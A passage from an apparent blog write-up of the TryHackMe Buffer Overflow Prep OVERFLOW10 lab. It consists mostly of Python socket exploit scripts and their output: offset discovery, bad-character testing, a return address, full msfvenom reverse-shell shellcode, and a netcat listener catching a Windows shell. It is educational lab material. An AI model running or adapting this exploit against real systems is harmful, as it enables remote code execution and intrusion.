y1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the EIP and note the value that is stored in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of10/thirdeip.png" title="Get EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the string from the regster through msf-pattern_offset to get the exact offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
└─$ msf-pattern_offset -l 1000 -q 41397241
[*] Exact match at offset 537
```
{% endraw %}

<br />
Update the code to include the offset value that we just calculated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 537
inputBuffer += b'B' * 4
inputBuffer += b'C' * (1000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 537
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (1000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Check the ESP register to view the baschars and find any mangles.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of10/firstbadesp.png" title="First Badchar ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\xa0\xad\xbe\xde\xef

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 537
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (1000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of10/narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nmod to get a list of modules and their security to find the appropriate module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of10/findaddy.png" title="Find address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that was discovered in the essfunc.dll.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\xa0\xad\xbe\xde\xef

payload = b'D' * 400

inputBuffer = b'A' * 537
inputBuffer += pack('<L',(0x625011af))
inputBuffer += badchars
inputBuffer += b'C' * (1000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW10]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -v payload -f python -b '\x00\xa0\xad\xbe\xde\xef'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of python file: 1887 bytes
payload =  b""
payload += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
payload += b"\x5e\x81\x76\x0e\x17\x42\xb7\x4f\x83\xee\xfc"
payload += b"\xe2\xf4\xeb\xaa\x35\x4f\x17\x42\xd7\xc6\xf2"
payload += b"\x73\x77\x2b\x9c\x12\x87\xc4\x45\x4e\x3c\x1d"
payload += b"\x03\xc9\xc5\x67\x18\xf5\xfd\x69\x26\xbd\x1b"
payload += b"\x73\x76\x3e\xb5\x63\x37\x83\x78\x42\x16\x85"
payload += b"\x55\xbd\x45\x15\x3c\x1d\x07\xc9\xfd\x73\x9c"
payload += b"\x0e\xa6\x37\xf4\x0a\xb6\x9e\x46\xc9\xee\x6f"
payload += b"\x16\x91\x3c\x06\x0f\xa1\x8d\x06\x9c\x76\x3c"
payload += b"\x4e\xc1\x73\x48\xe3\xd6\x8d\xba\x4e\xd0\x7a"
payload += b"\x57\x3a\xe1\x41\xca\xb7\x2c\x3f\x93\x3a\xf3"
payload += b"\x1a\x3c\x17\x33\x43\x64\x29\x9c\x4e\xfc\xc4"
payload += b"\x4f\x5e\xb6\x9c\x9c\x46\x3c\x4e\xc7\xcb\xf3"
payload += b"\x6b\x33\x19\xec\x2e\x4e\x18\xe6\xb0\xf7\x1d"
payload += b"\xe8\x15\x9c\x50\x5c\xc2\x4a\x2a\x84\x7d\x17"
payload += b"\x42\xdf\x38\x64\x70\xe8\x1b\x7f\x0e\xc0\x69"
payload += b"\x10\xbd\x62\xf7\x87\x43\xb7\x4f\x3e\x86\xe3"
payload += b"\x1f\x7f\x6b\x37\x24\x17\xbd\x62\x1f\x47\x12"
payload += b"\xe7\x0f\x47\x02\xe7\x27\xfd\x4d\x68\xaf\xe8"
payload += b"\x97\x20\x25\x12\x2a\xbd\x4f\x17\x44\xdf\x4d"
payload += b"\x17\x43\x0c\xc6\xf1\x28\xa7\x19\x40\x2a\x2e"
payload += b"\xea\x63\x23\x48\x9a\x92\x82\xc3\x43\xe8\x0c"
payload += b"\xbf\x3a\xfb\x2a\x47\xfa\xb5\x14\x48\x9a\x7f"
payload += b"\x21\xda\x2b\x17\xcb\x54\x18\x40\x15\x86\xb9"
payload += b"\x7d\x50\xee\x19\xf5\xbf\xd1\x88\x53\x66\x8b"
payload += b"\x4e\x16\xcf\xf3\x6b\x07\x84\xb7\x0b\x43\x12"
payload += b"\xe1\x19\x41\x04\xe1\x01\x41\x14\xe4\x19\x7f"
payload += b"\x3b\x7b\x70\x91\xbd\x62\xc6\xf7\x0c\xe1\x09"
payload += b"\xe8\x72\xdf\x47\x90\x5f\xd7\xb0\xc2\xf9\x57"
payload += b"\x52\x3d\x48\xdf\xe9\x82\xff\x2a\xb0\xc2\x7e"
payload += b"\xb1\x33\x1d\xc2\x4c\xaf\x62\x47\x0c\x08\x04"
payload += b"\x30\xd8\x25\x17\x11\x48\x9a" 
```
{% endraw %}

<br />
Update the code with a nop sled and the payload we just generated.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\xa0\xad\xbe\xde\xef

payload =  b""
payload += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
payload += b"\x5e\x81\x76\x0e\x17\x42\xb7\x4f\x83\xee\xfc"
payload += b"\xe2\xf4\xeb\xaa\x35\x4f\x17\x42\xd7\xc6\xf2"
payload += b"\x73\x77\x2b\x9c\x12\x87\xc4\x45\x4e\x3c\x1d"
payload += b"\x03\xc9\xc5\x67\x18\xf5\xfd\x69\x26\xbd\x1b"
payload += b"\x73\x76\x3e\xb5\x63\x37\x83\x78\x42\x16\x85"
payload += b"\x55\xbd\x45\x15\x3c\x1d\x07\xc9\xfd\x73\x9c"
payload += b"\x0e\xa6\x37\xf4\x0a\xb6\x9e\x46\xc9\xee\x6f"
payload += b"\x16\x91\x3c\x06\x0f\xa1\x8d\x06\x9c\x76\x3c"
payload += b"\x4e\xc1\x73\x48\xe3\xd6\x8d\xba\x4e\xd0\x7a"
payload += b"\x57\x3a\xe1\x41\xca\xb7\x2c\x3f\x93\x3a\xf3"
payload += b"\x1a\x3c\x17\x33\x43\x64\x29\x9c\x4e\xfc\xc4"
payload += b"\x4f\x5e\xb6\x9c\x9c\x46\x3c\x4e\xc7\xcb\xf3"
payload += b"\x6b\x33\x19\xec\x2e\x4e\x18\xe6\xb0\xf7\x1d"
payload += b"\xe8\x15\x9c\x50\x5c\xc2\x4a\x2a\x84\x7d\x17"
payload += b"\x42\xdf\x38\x64\x70\xe8\x1b\x7f\x0e\xc0\x69"
payload += b"\x10\xbd\x62\xf7\x87\x43\xb7\x4f\x3e\x86\xe3"
payload += b"\x1f\x7f\x6b\x37\x24\x17\xbd\x62\x1f\x47\x12"
payload += b"\xe7\x0f\x47\x02\xe7\x27\xfd\x4d\x68\xaf\xe8"
payload += b"\x97\x20\x25\x12\x2a\xbd\x4f\x17\x44\xdf\x4d"
payload += b"\x17\x43\x0c\xc6\xf1\x28\xa7\x19\x40\x2a\x2e"
payload += b"\xea\x63\x23\x48\x9a\x92\x82\xc3\x43\xe8\x0c"
payload += b"\xbf\x3a\xfb\x2a\x47\xfa\xb5\x14\x48\x9a\x7f"
payload += b"\x21\xda\x2b\x17\xcb\x54\x18\x40\x15\x86\xb9"
payload += b"\x7d\x50\xee\x19\xf5\xbf\xd1\x88\x53\x66\x8b"
payload += b"\x4e\x16\xcf\xf3\x6b\x07\x84\xb7\x0b\x43\x12"
payload += b"\xe1\x19\x41\x04\xe1\x01\x41\x14\xe4\x19\x7f"
payload += b"\x3b\x7b\x70\x91\xbd\x62\xc6\xf7\x0c\xe1\x09"
payload += b"\xe8\x72\xdf\x47\x90\x5f\xd7\xb0\xc2\xf9\x57"
payload += b"\x52\x3d\x48\xdf\xe9\x82\xff\x2a\xb0\xc2\x7e"
payload += b"\xb1\x33\x1d\xc2\x4c\xaf\x62\x47\x0c\x08\x04"
payload += b"\x30\xd8\x25\x17\x11\x48\x9a"

inputBuffer = b'A' * 537
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 90
inputBuffer += payload
inputBuffer += b'C' * (1000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.  Run the code.  Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW10]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56199
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}